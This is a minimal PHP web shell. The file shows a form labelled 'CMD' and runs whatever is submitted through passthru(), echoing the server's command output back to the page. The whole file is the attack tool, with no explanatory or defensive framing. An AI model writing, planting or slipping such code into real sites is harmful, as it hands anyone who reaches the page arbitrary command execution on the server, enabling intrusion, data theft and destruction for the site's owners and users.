<? 

        echo "
                <FORM ACTION=$PHP_SELF METHOD=POST>
                CMD : <INPUT TYPE=TEXT NAME=command SIZE=40>
                <INPUT TYPE=SUBMIT VALUE='Enter'></FORM>
                <HR><XMP></XMP><HR>";

        $command = str_replace('/', '', $command);
        echo "<XMP>"; passthru($command); echo "</XMP>";
?>
